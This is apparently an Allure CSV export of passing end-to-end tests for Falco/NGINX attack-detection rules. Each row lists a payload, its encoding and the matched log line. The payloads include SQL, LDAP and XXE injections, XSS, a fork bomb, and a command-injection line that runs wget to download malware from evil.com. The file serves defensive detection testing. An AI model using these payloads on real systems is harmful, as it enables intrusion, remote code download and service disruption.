"DESCRIPTION","DURATION IN MS","NAME","PARENT SUITE","START TIME","STATUS","STOP TIME","SUB SUITE","SUITE","TEST CLASS","TEST METHOD"
"## Attack Pattern Information

| Item | Value |
|------|-------|
| **Pattern ID** | `LDAP_BASIC_002` |
| **Name** | LDAP password bypass injection |
| **Category** | LDAP |
| **Subcategory** | basic_injection |
| **Severity** | `HIGH` |

## Attack Details

- **Payload**: `*)(|(password=*))`
- **Encoded**: `*)(|(password%3D*))`
- **Expected Detection**: Yes

## Test Execution Results

- **Status**: `PASSED`
- **Detection Count**: 1 / 1
- **Latency**: ~84000ms
- **Timestamp**: 08:19:54.000 UTC

## Rule Mapping

| Item | Value |
|------|-------|
| **Expected Rule** | `[NGINX LDAP Injection] Authentication bypass attempt` |
| **Matched Rule** | `[NGINX LDAP Injection] Authentication bypass attempt test_id=LDAP_BASIC_002-1772266794774-9k4j8 pattern_id=LDAP_BASIC_002 uri=/?q=*)(|(password%3D*)) client=127.0.0.1` |
| **Rule Match** | ✅ Match |

## Detection Evidence

**Rule Name**: [NGINX LDAP Injection] Authentication bypass attempt test_id=LDAP_BASIC_002-1772266794774-9k4j8 pattern_id=LDAP_BASIC_002 uri=/?q=*)(|(password%3D*)) client=127.0.0.1

**Falco Log Entry**:
```
08:19:54.000000000: Critical [NGINX LDAP Injection] Authentication bypass attempt test_id=LDAP_BASIC_002-1772266794774-9k4j8 pattern_id=LDAP_BASIC_002 uri=/?q=*)(|(password%3D*)) client=127.0.0.1
```","2","test_e2e_with_logs[427_LDAP_BASIC_002]","allure","2026-02-28","passed","2026-02-28","","test_e2e_wrapper","",""
"## Attack Pattern Information

| Item | Value |
|------|-------|
| **Pattern ID** | `HRS_LOWCASE_001` |
| **Name** | Lowercase Transfer-Encoding |
| **Category** | HTTP_SMUGGLING |
| **Subcategory** | obfuscation |
| **Severity** | `HIGH` |

## Attack Details

- **Payload**: `transfer-encoding:chunked`
- **Encoded**: `transfer-encoding:chunked`
- **Expected Detection**: Yes

## Test Execution Results

- **Status**: `PASSED`
- **Detection Count**: 1 / 1
- **Latency**: ~32000ms
- **Timestamp**: 08:20:46.000 UTC

## Rule Mapping

| Item | Value |
|------|-------|
| **Expected Rule** | `[NGINX HRS] HTTP Request Smuggling attempt` |
| **Matched Rule** | `[NGINX HRS] HTTP Request Smuggling attempt test_id=HRS_LOWCASE_001-1772266846289-wxgkil pattern_id=HRS_LOWCASE_001 uri=/?q=transfer-encoding:chunked client=127.0.0.1` |
| **Rule Match** | ✅ Match |

## Detection Evidence

**Rule Name**: [NGINX HRS] HTTP Request Smuggling attempt test_id=HRS_LOWCASE_001-1772266846289-wxgkil pattern_id=HRS_LOWCASE_001 uri=/?q=transfer-encoding:chunked client=127.0.0.1

**Falco Log Entry**:
```
08:20:46.000000000: Critical [NGINX HRS] HTTP Request Smuggling attempt test_id=HRS_LOWCASE_001-1772266846289-wxgkil pattern_id=HRS_LOWCASE_001 uri=/?q=transfer-encoding:chunked client=127.0.0.1
```","2","test_e2e_with_logs[649_HRS_LOWCASE_001]","allure","2026-02-28","passed","2026-02-28","","test_e2e_wrapper","",""
"## Attack Pattern Information

| Item | Value |
|------|-------|
| **Pattern ID** | `CRLF_ENC_002` |
| **Name** | LF-Only Injection (lowercase) |
| **Category** | CRLF |
| **Subcategory** | encoded_crlf |
| **Severity** | `HIGH` |

## Attack Details

- **Payload**: `LF-only line feed injection`
- **Encoded**: `%0aInjectedHeader%3Atrue`
- **Expected Detection**: Yes

## Test Execution Results

- **Status**: `PASSED`
- **Detection Count**: 1 / 1
- **Latency**: ~23000ms
- **Timestamp**: 08:20:55.000 UTC

## Rule Mapping

| Item | Value |
|------|-------|
| **Expected Rule** | `[NGINX CRLF] CRLF Injection attempt detected` |
| **Matched Rule** | `[NGINX CRLF] CRLF Injection attempt detected test_id=CRLF_ENC_002-1772266855286-6f3vep pattern_id=CRLF_ENC_002 uri=/?q=%0aInjectedHeader%3Atrue client=127.0.0.1` |
| **Rule Match** | ✅ Match |

## Detection Evidence

**Rule Name**: [NGINX CRLF] CRLF Injection attempt detected test_id=CRLF_ENC_002-1772266855286-6f3vep pattern_id=CRLF_ENC_002 uri=/?q=%0aInjectedHeader%3Atrue client=127.0.0.1

**Falco Log Entry**:
```
08:20:55.000000000: Warning [NGINX CRLF] CRLF Injection attempt detected test_id=CRLF_ENC_002-1772266855286-6f3vep pattern_id=CRLF_ENC_002 uri=/?q=%0aInjectedHeader%3Atrue client=127.0.0.1
```","2","test_e2e_with_logs[550_CRLF_ENC_002]","allure","2026-02-28","passed","2026-02-28","","test_e2e_wrapper","",""
"## Attack Pattern Information

| Item | Value |
|------|-------|
| **Pattern ID** | `GQL_INTRO_005` |
| **Name** | GraphQL URL-encoded __schema introspection |
| **Category** | GRAPHQL |
| **Subcategory** | introspection |
| **Severity** | `MEDIUM` |

## Attack Details

- **Payload**: `__schema{queryType}`
- **Encoded**: `%5F%5Fschema%7BqueryType%7D`
- **Expected Detection**: Yes

## Test Execution Results

- **Status**: `PASSED`
- **Detection Count**: 1 / 1
- **Latency**: ~71000ms
- **Timestamp**: 08:20:07.000 UTC

## Rule Mapping

| Item | Value |
|------|-------|
| **Expected Rule** | `[NGINX GraphQL Attack] Introspection query detected` |
| **Matched Rule** | `[NGINX GraphQL Attack] Introspection query detected test_id=GQL_INTRO_005-1772266807281-i3b0cy8 pattern_id=GQL_INTRO_005 uri=/?q=%5F%5Fschema%7BqueryType%7D client=127.0.0.1` |
| **Rule Match** | ✅ Match |

## Detection Evidence

**Rule Name**: [NGINX GraphQL Attack] Introspection query detected test_id=GQL_INTRO_005-1772266807281-i3b0cy8 pattern_id=GQL_INTRO_005 uri=/?q=%5F%5Fschema%7BqueryType%7D client=127.0.0.1

**Falco Log Entry**:
```
08:20:07.000000000: Warning [NGINX GraphQL Attack] Introspection query detected test_id=GQL_INTRO_005-1772266807281-i3b0cy8 pattern_id=GQL_INTRO_005 uri=/?q=%5F%5Fschema%7BqueryType%7D client=127.0.0.1
```","2","test_e2e_with_logs[621_GQL_INTRO_005]","allure","2026-02-28","passed","2026-02-28","","test_e2e_wrapper","",""
"## Attack Pattern Information

| Item | Value |
|------|-------|
| **Pattern ID** | `XSS_MUT_008` |
| **Name** | Video tag XSS |
| **Category** | XSS |
| **Subcategory** | mutation |
| **Severity** | `HIGH` |

## Attack Details

- **Payload**: `<video src=x onerror=alert('XSS')>`
- **Encoded**: `%3Cvideo%20src%3Dx%20onerror%3Dalert('XSS')%3E`
- **Expected Detection**: Yes

## Test Execution Results

- **Status**: `PASSED`
- **Detection Count**: 1 / 1
- **Latency**: ~65000ms
- **Timestamp**: 08:20:13.000 UTC

## Rule Mapping

| Item | Value |
|------|-------|
| **Expected Rule** | `[NGINX XSS] DOM-based XSS Attack` |
| **Matched Rule** | `[NGINX XSS] DOM-based XSS Attack test_id=XSS_MUT_008-1772266813361-snxsg4 pattern_id=XSS_MUT_008 uri=/?q=%3Cvideo%20src%3Dx%20onerror%3Dalert('XSS')%3E client=127.0.0.1 method=GET` |
| **Rule Match** | ✅ Match |

## Detection Evidence

**Rule Name**: [NGINX XSS] DOM-based XSS Attack test_id=XSS_MUT_008-1772266813361-snxsg4 pattern_id=XSS_MUT_008 uri=/?q=%3Cvideo%20src%3Dx%20onerror%3Dalert('XSS')%3E client=127.0.0.1 method=GET

**Falco Log Entry**:
```
08:20:13.000000000: Critical [NGINX XSS] DOM-based XSS Attack test_id=XSS_MUT_008-1772266813361-snxsg4 pattern_id=XSS_MUT_008 uri=/?q=%3Cvideo%20src%3Dx%20onerror%3Dalert('XSS')%3E client=127.0.0.1 method=GET
```","2","test_e2e_with_logs[190_XSS_MUT_008]","allure","2026-02-28","passed","2026-02-28","","test_e2e_wrapper","",""
"## Attack Pattern Information

| Item | Value |
|------|-------|
| **Pattern ID** | `CMD_PROC_001` |
| **Name** | Fork bomb attempt |
| **Category** | CMDINJ |
| **Subcategory** | process_spawning |
| **Severity** | `CRITICAL` |

## Attack Details

- **Payload**: `:(){ :|:& };:`
- **Encoded**: `%3A()%7B%20%3A%7C%3A%26%20%7D%3B%3A`
- **Expected Detection**: Yes

## Test Execution Results

- **Status**: `PASSED`
- **Detection Count**: 1 / 1
- **Latency**: ~68000ms
- **Timestamp**: 08:20:10.000 UTC

## Rule Mapping

| Item | Value |
|------|-------|
| **Expected Rule** | `[NGINX CMDi] Advanced command injection attempt` |
| **Matched Rule** | `[NGINX CMDi] Advanced command injection attempt test_id=CMD_PROC_001-1772266810330-i5umi pattern_id=CMD_PROC_001 uri=/?q=%3A()%7B%20%3A%7C%3A%26%20%7D%3B%3A client=127.0.0.1` |
| **Rule Match** | ✅ Match |

## Detection Evidence

**Rule Name**: [NGINX CMDi] Advanced command injection attempt test_id=CMD_PROC_001-1772266810330-i5umi pattern_id=CMD_PROC_001 uri=/?q=%3A()%7B%20%3A%7C%3A%26%20%7D%3B%3A client=127.0.0.1

**Falco Log Entry**:
```
08:20:10.000000000: Warning [NGINX CMDi] Advanced command injection attempt test_id=CMD_PROC_001-1772266810330-i5umi pattern_id=CMD_PROC_001 uri=/?q=%3A()%7B%20%3A%7C%3A%26%20%7D%3B%3A client=127.0.0.1
```","2","test_e2e_with_logs[384_CMD_PROC_001]","allure","2026-02-28","passed","2026-02-28","","test_e2e_wrapper","",""
"## Attack Pattern Information

| Item | Value |
|------|-------|
| **Pattern ID** | `HPP_FILTER_002` |
| **Name** | HPP triple override combo |
| **Category** | HPP |
| **Subcategory** | filter_evasion |
| **Severity** | `MEDIUM` |

## Attack Details

- **Payload**: `&debug=1&admin=true&override=1`
- **Encoded**: `%26debug%3D1%26admin%3Dtrue%26override%3D1`
- **Expected Detection**: Yes

## Test Execution Results

- **Status**: `PASSED`
- **Detection Count**: 1 / 1
- **Latency**: ~14000ms
- **Timestamp**: 08:21:04.000 UTC

## Rule Mapping

| Item | Value |
|------|-------|
| **Expected Rule** | `[NGINX HPP] HTTP Parameter Pollution attempt detected` |
| **Matched Rule** | `[NGINX HPP] HTTP Parameter Pollution attempt detected test_id=HPP_FILTER_002-1772266864786-w47ck pattern_id=HPP_FILTER_002 uri=/?q=%26debug%3D1%26admin%3Dtrue%26override%3D1 client=127.0.0.1` |
| **Rule Match** | ✅ Match |

## Detection Evidence

**Rule Name**: [NGINX HPP] HTTP Parameter Pollution attempt detected test_id=HPP_FILTER_002-1772266864786-w47ck pattern_id=HPP_FILTER_002 uri=/?q=%26debug%3D1%26admin%3Dtrue%26override%3D1 client=127.0.0.1

**Falco Log Entry**:
```
08:21:04.000000000: Warning [NGINX HPP] HTTP Parameter Pollution attempt detected test_id=HPP_FILTER_002-1772266864786-w47ck pattern_id=HPP_FILTER_002 uri=/?q=%26debug%3D1%26admin%3Dtrue%26override%3D1 client=127.0.0.1
```","2","test_e2e_with_logs[578_HPP_FILTER_002]","allure","2026-02-28","passed","2026-02-28","","test_e2e_wrapper","",""
"## Attack Pattern Information

| Item | Value |
|------|-------|
| **Pattern ID** | `LDAP_BASIC_005` |
| **Name** | LDAP object class enumeration |
| **Category** | LDAP |
| **Subcategory** | basic_injection |
| **Severity** | `MEDIUM` |

## Attack Details

- **Payload**: `*)(&(objectClass=*)`
- **Encoded**: `*)(%26(objectClass%3D*)`
- **Expected Detection**: Yes

## Test Execution Results

- **Status**: `PASSED`
- **Detection Count**: 1 / 1
- **Latency**: ~82000ms
- **Timestamp**: 08:19:56.000 UTC

## Rule Mapping

| Item | Value |
|------|-------|
| **Expected Rule** | `[NGINX LDAP Injection] Authentication bypass attempt` |
| **Matched Rule** | `[NGINX LDAP Injection] Authentication bypass attempt test_id=LDAP_BASIC_005-1772266796278-qpfda6 pattern_id=LDAP_BASIC_005 uri=/?q=*)(%26(objectClass%3D*) client=127.0.0.1` |
| **Rule Match** | ✅ Match |

## Detection Evidence

**Rule Name**: [NGINX LDAP Injection] Authentication bypass attempt test_id=LDAP_BASIC_005-1772266796278-qpfda6 pattern_id=LDAP_BASIC_005 uri=/?q=*)(%26(objectClass%3D*) client=127.0.0.1

**Falco Log Entry**:
```
08:19:56.000000000: Critical [NGINX LDAP Injection] Authentication bypass attempt test_id=LDAP_BASIC_005-1772266796278-qpfda6 pattern_id=LDAP_BASIC_005 uri=/?q=*)(%26(objectClass%3D*) client=127.0.0.1
```","2","test_e2e_with_logs[432_LDAP_BASIC_005]","allure","2026-02-28","passed","2026-02-28","","test_e2e_wrapper","",""
"## Attack Pattern Information

| Item | Value |
|------|-------|
| **Pattern ID** | `SQLI_BOOL_005` |
| **Name** | Double quote boolean injection |
| **Category** | SQLI |
| **Subcategory** | boolean_based_blind |
| **Severity** | `HIGH` |

## Attack Details

- **Payload**: `"" OR ""1""=""1`
- **Encoded**: `%22%20OR%20%221%22%3D%221`
- **Expected Detection**: Yes

## Test Execution Results

- **Status**: `PASSED`
- **Detection Count**: 1 / 1
- **Latency**: ~98000ms
- **Timestamp**: 08:19:40.000 UTC

## Rule Mapping

| Item | Value |
|------|-------|
| **Expected Rule** | `[NGINX SQLi] Boolean-based Blind SQL Injection` |
| **Matched Rule** | `[NGINX SQLi] Boolean-based Blind SQL Injection test_id=SQLI_BOOL_005-1772266780299-ffgdt pattern_id=SQLI_BOOL_005 uri=/?q=%22%20OR%20%221%22%3D%221 client=127.0.0.1 method=GET` |
| **Rule Match** | ✅ Match |

## Detection Evidence

**Rule Name**: [NGINX SQLi] Boolean-based Blind SQL Injection test_id=SQLI_BOOL_005-1772266780299-ffgdt pattern_id=SQLI_BOOL_005 uri=/?q=%22%20OR%20%221%22%3D%221 client=127.0.0.1 method=GET

**Falco Log Entry**:
```
08:19:40.000000000: Critical [NGINX SQLi] Boolean-based Blind SQL Injection test_id=SQLI_BOOL_005-1772266780299-ffgdt pattern_id=SQLI_BOOL_005 uri=/?q=%22%20OR%20%221%22%3D%221 client=127.0.0.1 method=GET
```","3","test_e2e_with_logs[041_SQLI_BOOL_005]","allure","2026-02-28","passed","2026-02-28","","test_e2e_wrapper","",""
"## Attack Pattern Information

| Item | Value |
|------|-------|
| **Pattern ID** | `XXE_JAR_001` |
| **Name** | XXE JAR protocol remote code execution |
| **Category** | XXE |
| **Subcategory** | protocol_abuse |
| **Severity** | `CRITICAL` |

## Attack Details

- **Payload**: `<!ENTITY xxe SYSTEM ""jar:http://attacker.com/evil.jar!/"">`
- **Encoded**: `%3C%21ENTITY%20xxe%20SYSTEM%20%22jar%3Ahttp%3A%2F%2Fattacker.com%2Fevil.jar%21%2F%22%3E`
- **Expected Detection**: Yes

## Test Execution Results

- **Status**: `PASSED`
- **Detection Count**: 1 / 1
- **Latency**: ~76000ms
- **Timestamp**: 08:20:02.000 UTC

## Rule Mapping

| Item | Value |
|------|-------|
| **Expected Rule** | `[NGINX XXE Attack] DOCTYPE/ENTITY injection` |
| **Matched Rule** | `[NGINX XXE Attack] DOCTYPE/ENTITY injection test_id=XXE_JAR_001-1772266802281-v6mq pattern_id=XXE_JAR_001 uri=/?q=%3C%21ENTITY%20xxe%20SYSTEM%20%22jar%3Ahttp%3A%2F%2Fattacker.com%2Fevil.jar%21%2F%22%3E client=127.0.0.1` |
| **Rule Match** | ✅ Match |

## Detection Evidence

**Rule Name**: [NGINX XXE Attack] DOCTYPE/ENTITY injection test_id=XXE_JAR_001-1772266802281-v6mq pattern_id=XXE_JAR_001 uri=/?q=%3C%21ENTITY%20xxe%20SYSTEM%20%22jar%3Ahttp%3A%2F%2Fattacker.com%2Fevil.jar%21%2F%22%3E client=127.0.0.1

**Falco Log Entry**:
```
08:20:02.000000000: Critical [NGINX XXE Attack] DOCTYPE/ENTITY injection test_id=XXE_JAR_001-1772266802281-v6mq pattern_id=XXE_JAR_001 uri=/?q=%3C%21ENTITY%20xxe%20SYSTEM%20%22jar%3Ahttp%3A%2F%2Fattacker.com%2Fevil.jar%21%2F%22%3E client=127.0.0.1
```","2","test_e2e_with_logs[625_XXE_JAR_001]","allure","2026-02-28","passed","2026-02-28","","test_e2e_wrapper","",""
"## Attack Pattern Information

| Item | Value |
|------|-------|
| **Pattern ID** | `SQLI_BOOL_006` |
| **Name** | Numeric comparison injection |
| **Category** | SQLI |
| **Subcategory** | boolean_based_blind |
| **Severity** | `HIGH` |

## Attack Details

- **Payload**: `1 AND 1>0`
- **Encoded**: `1%20AND%201%3E0`
- **Expected Detection**: Yes

## Test Execution Results

- **Status**: `PASSED`
- **Detection Count**: 1 / 1
- **Latency**: ~98000ms
- **Timestamp**: 08:19:40.000 UTC

## Rule Mapping

| Item | Value |
|------|-------|
| **Expected Rule** | `[NGINX SQLi] Boolean-based Blind SQL Injection` |
| **Matched Rule** | `[NGINX SQLi] Boolean-based Blind SQL Injection test_id=SQLI_BOOL_006-1772266780800-91kpzo pattern_id=SQLI_BOOL_006 uri=/?q=1%20AND%201%3E0 client=127.0.0.1 method=GET` |
| **Rule Match** | ✅ Match |

## Detection Evidence

**Rule Name**: [NGINX SQLi] Boolean-based Blind SQL Injection test_id=SQLI_BOOL_006-1772266780800-91kpzo pattern_id=SQLI_BOOL_006 uri=/?q=1%20AND%201%3E0 client=127.0.0.1 method=GET

**Falco Log Entry**:
```
08:19:40.000000000: Critical [NGINX SQLi] Boolean-based Blind SQL Injection test_id=SQLI_BOOL_006-1772266780800-91kpzo pattern_id=SQLI_BOOL_006 uri=/?q=1%20AND%201%3E0 client=127.0.0.1 method=GET
```","2","test_e2e_with_logs[042_SQLI_BOOL_006]","allure","2026-02-28","passed","2026-02-28","","test_e2e_wrapper","",""
"## Attack Pattern Information

| Item | Value |
|------|-------|
| **Pattern ID** | `EMRG_COUCH_003` |
| **Name** | CouchDB users database enumeration |
| **Category** | NOSQL |
| **Subcategory** | couchdb |
| **Severity** | `CRITICAL` |

## Attack Details

- **Payload**: `_users/_all_docs`
- **Encoded**: `_users%2F_all_docs`
- **Expected Detection**: Yes

## Test Execution Results

- **Status**: `PASSED`
- **Detection Count**: 1 / 1
- **Latency**: ~54000ms
- **Timestamp**: 08:20:24.000 UTC

## Rule Mapping

| Item | Value |
|------|-------|
| **Expected Rule** | `[NGINX Emerging Threat] MongoDB NoSQL injection` |
| **Matched Rule** | `[NGINX Emerging Threat] MongoDB NoSQL injection test_id=EMRG_COUCH_003-1772266824286-6qzhtp pattern_id=EMRG_COUCH_003 uri=/?q=_users%2F_all_docs client=127.0.0.1` |
| **Rule Match** | ✅ Match |

## Detection Evidence

**Rule Name**: [NGINX Emerging Threat] MongoDB NoSQL injection test_id=EMRG_COUCH_003-1772266824286-6qzhtp pattern_id=EMRG_COUCH_003 uri=/?q=_users%2F_all_docs client=127.0.0.1

**Falco Log Entry**:
```
08:20:24.000000000: Critical [NGINX Emerging Threat] MongoDB NoSQL injection test_id=EMRG_COUCH_003-1772266824286-6qzhtp pattern_id=EMRG_COUCH_003 uri=/?q=_users%2F_all_docs client=127.0.0.1
```","2","test_e2e_with_logs[500_EMRG_COUCH_003]","allure","2026-02-28","passed","2026-02-28","","test_e2e_wrapper","",""
"## Attack Pattern Information

| Item | Value |
|------|-------|
| **Pattern ID** | `CMDI_WGET_001` |
| **Name** | Wget malware download |
| **Category** | CMDINJ |
| **Subcategory** | malware_download |
| **Severity** | `CRITICAL` |

## Attack Details

- **Payload**: `;wget http://evil.com/malware -O /tmp/m`
- **Encoded**: `%3Bwget%20http%3A%2F%2Fevil.com%2Fmalware%20-O%20%2Ftmp%2Fm`
- **Expected Detection**: Yes

## Test Execution Results

- **Status**: `PASSED`
- **Detection Count**: 1 / 1
- **Latency**: ~47000ms
- **Timestamp**: 08:20:31.000 UTC

## Rule Mapping

| Item | Value |
|------|-------|
| **Expected Rule** | `[NGINX CMDi] Command injection via semicolon` |
| **Matched Rule** | `[NGINX CMDi] Command injection via semicolon test_id=CMDI_WGET_001-1772266831885-2m6gbr pattern_id=CMDI_WGET_001 uri=/?q=%3Bwget%20http%3A%2F%2Fevil.com%2Fmalware%20-O%20%2Ftmp%2Fm client=127.0.0.1` |
| **Rule Match** | ✅ Match |

## Detection Evidence

**Rule Name**: [NGINX CMDi] Command injection via semicolon test_id=CMDI_WGET_001-1772266831885-2m6gbr pattern_id=CMDI_WGET_001 uri=/?q=%3Bwget%20http%3A%2F%2Fevil.com%2Fmalware%20-O%20%2Ftmp%2Fm client=127.0.0.1

**Falco Log Entry**:
```
08:20:31.000000000: Critical [NGINX CMDi] Command injection via semicolon test_id=CMDI_WGET_001-1772266831885-2m6gbr pattern_id=CMDI_WGET_001 uri=/?q=%3Bwget%20http%3A%2F%2Fevil.com%2Fmalware%20-O%20%2Ftmp%2Fm client=127.0.0.1
```","3","test_e2e_with_logs[767_CMDI_WGET_001]","allure","2026-02-28","passed","2026-02-28","","test_e2e_wrapper","",""
"## Attack Pattern Information

| Item | Value |
|------|-------|
| **Pattern ID** | `SQLI_ADV_081` |
| **Name** | Boolean Injection with Quotes |
| **Category** | SQLI |
| **Subcategory** | advanced |
| **Severity** | `HIGH` |

## Attack Details

- **Payload**: `' AND '1'='1'--`
- **Encoded**: `%27%20AND%20%271%27%3D%271%27--`
- **Expected Detection**: Yes

## Test Execution Results

- **Status**: `PASSED`
- **Detection Count**: 1 / 1
- **Latency**: ~69000ms
- **Timestamp**: 08:20:09.000 UTC

## Rule Mapping

| Item | Value |
|------|-------|
| **Expected Rule** | `[NGINX SQLi] Boolean-based Blind SQL Injection` |
| **Matched Rule** | `[NGINX SQLi] Boolean-based Blind SQL Injection test_id=SQLI_ADV_081-1772266809359-iwpab pattern_id=SQLI_ADV_081 uri=/?q=%27%20AND%20%271%27%3D%271%27-- client=127.0.0.1 method=GET` |
| **Rule Match** | ✅ Match |

## Detection Evidence

**Rule Name**: [NGINX SQLi] Boolean-based Blind SQL Injection test_id=SQLI_ADV_081-1772266809359-iwpab pattern_id=SQLI_ADV_081 uri=/?q=%27%20AND%20%271%27%3D%271%27-- client=127.0.0.1 method=GET

**Falco Log Entry**:
```
08:20:09.000000000: Critical [NGINX SQLi] Boolean-based Blind SQL Injection test_id=SQLI_ADV_081-1772266809359-iwpab pattern_id=SQLI_ADV_081 uri=/?q=%27%20AND%20%271%27%3D%271%27-- client=127.0.0.1 method=GET
```","2","test_e2e_with_logs[010_SQLI_ADV_081]","allure","2026-02-28","passed","2026-02-28","","test_e2e_wrapper","",""
"## Attack Pattern Information

| Item | Value |
|------|-------|
| **Pattern ID** | `PICKLE_DESER_004` |
| **Name** | Class MRO Traversal Attack |
| **Category** | PICKLE |
| **Subcategory** | deserialization |
| **Severity** | `HIGH` |

## Attack Details

- **Payload**: `__class__.__mro__[1].__subclasses__()`
- **Encoded**: `%5F%5Fclass%5F%5F.%5F%5Fmro%5F%5F%5B1%5D.%5F%5Fsubclasses%5F%5F%28%29`
- **Expected Detection**: Yes

## Test Execution Results

- **Status**: `PASSED`
- **Detection Count**: 1 / 1
- **Latency**: ~48000ms
- **Timestamp**: 08:20:30.000 UTC

## Rule Mapping

| Item | Value |
|------|-------|
| **Expected Rule** | `[NGINX Pickle Attack] Pickle deserialization attack attempt` |
| **Matched Rule** | `[NGINX Pickle Attack] Pickle deserialization attack attempt test_id=PICKLE_DESER_004-1772266830778-76nlw pattern_id=PICKLE_DESER_004 uri=/?q=%5F%5Fclass%5F%5F.%5F%5Fmro%5F%5F%5B1%5D.%5F%5Fsubclasses%5F%5F%28%29 client=127.0.0.1` |
| **Rule Match** | ✅ Match |

## Detection Evidence

**Rule Name**: [NGINX Pickle Attack] Pickle deserialization attack attempt test_id=PICKLE_DESER_004-1772266830778-76nlw pattern_id=PICKLE_DESER_004 uri=/?q=%5F%5Fclass%5F%5F.%5F%5Fmro%5F%5F%5B1%5D.%5F%5Fsubclasses%5F%5F%28%29 client=127.0.0.1

**Falco Log Entry**:
```
08:20:30.000000000: Critical [NGINX Pickle Attack] Pickle deserialization attack attempt test_id=PICKLE_DESER_004-1772266830778-76nlw pattern_id=PICKLE_DESER_004 uri=/?q=%5F%5Fclass%5F%5F.%5F%5Fmro%5F%5F%5B1%5D.%5F%5Fsubclasses%5F%5F%28%29 client=127.0.0.1
```","2","test_e2e_with_logs[517_PICKLE_DESER_004]","allure","2026-02-28","passed","2026-02-28","","test_e2e_wrapper","",""
"## Attack Pattern Information

| Item | Value |
|------|-------|
| **Pattern ID** | `SQLI_ERROR_014` |
| **Name** | PostgreSQL information schema enumeration |
| **Category** | SQLI |
| **Subcategory** | error_based |
| **Severity** | `HIGH` |

## Attack Details

- **Payload**: `' AND (1)=(SELECT COUNT(*) FROM information_schema.tables WHERE table_name LIKE '%user%') --`
- **Encoded**: `%27%20AND%20%281%29%3D%28SELECT%20COUNT%28%2A%29%20FROM%20information_schema.tables%20WHERE%20table_name%20LIKE%20%27%25user%25%27%29%20--`
- **Expected Detection**: Yes

## Test Execution Results

- **Status**: `PASSED`
- **Detection Count**: 1 / 1
- **Latency**: ~58000ms
- **Timestamp**: 08:20:20.000 UTC

## Rule Mapping

| Item | Value |
|------|-------|
| **Expected Rule** | `[NGINX SQLi] Boolean-based Blind SQL Injection` |
| **Matched Rule** | `[NGINX SQLi] Boolean-based Blind SQL Injection test_id=SQLI_ERROR_014-1772266820383-ft53sc pattern_id=SQLI_ERROR_014 uri=/?q=%27%20AND%20%281%29%3D%28SELECT%20COUNT%28%2A%29%20FROM%20information_schema.tables%20WHERE%20table_name%20LIKE%20%27%25user%25%27%29%20-- client=127.0.0.1 method=GET` |
| **Rule Match** | ✅ Match |

## Detection Evidence

**Rule Name**: [NGINX SQLi] Boolean-based Blind SQL Injection test_id=SQLI_ERROR_014-1772266820383-ft53sc pattern_id=SQLI_ERROR_014 uri=/?q=%27%20AND%20%281%29%3D%28SELECT%20COUNT%28%2A%29%20FROM%20information_schema.tables%20WHERE%20table_name%20LIKE%20%27%25user%25%27%29%20-- client=127.0.0.1 method=GET

**Falco Log Entry**:
```
08:20:20.000000000: Critical [NGINX SQLi] Boolean-based Blind SQL Injection test_id=SQLI_ERROR_014-1772266820383-ft53sc pattern_id=SQLI_ERROR_014 uri=/?q=%27%20AND%20%281%29%3D%28SELECT%20COUNT%28%2A%29%20FROM%20information_schema.tables%20WHERE%20table_name%20LIKE%20%27%25user%25%27%29%20-- client=127.0.0.1 method=GET
```","2","test_e2e_with_logs[080_SQLI_ERROR_014]","allure","2026-02-28","passed","2026-02-28","","test_e2e_wrapper","",""
